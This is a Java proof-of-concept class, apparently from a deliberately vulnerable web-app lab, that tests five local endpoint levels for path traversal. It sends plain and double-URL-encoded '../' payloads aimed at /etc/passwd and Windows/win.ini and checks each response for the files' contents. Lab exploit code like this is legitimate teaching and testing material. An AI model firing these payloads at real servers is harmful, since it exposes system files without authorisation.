package cn.bestsec.vulweb.poc;

import lombok.extern.slf4j.Slf4j;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.io.IOException;

@Slf4j
public class PathTraversalPoc {
    public static void main(String[] args){
        String baseUrl = "http://localhost:8080/file/level%d?p=";
        for(int i = 1; i <= 5; i++){
            String target = String.format(baseUrl, i);
            if(isVul(target)){
                log.info(target + "存在漏洞");
            }else{
                log.info(target + "不存在漏洞");
            }
        }
    }

    public static boolean isVul(String target){
        String[] payloads = new String[]{
                "../../../../../../../../../../../../Windows/win.ini",
                "../../../../../../../../../../../../etc/passwd",
                "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fwin.ini",
                "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        };
        OkHttpClient okHttpClient = new OkHttpClient();
        for(String payload : payloads){
            Request request = new Request.Builder().url(target + payload).build();
            Call call = okHttpClient.newCall(request);
            try(Response response = call.execute()){

                if(response.body() != null){
                    String body = response.body().string();
                    if(body.contains("[extensions]") || body.contains("root:")){
                        return true;
                    }
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return false;
    }
}
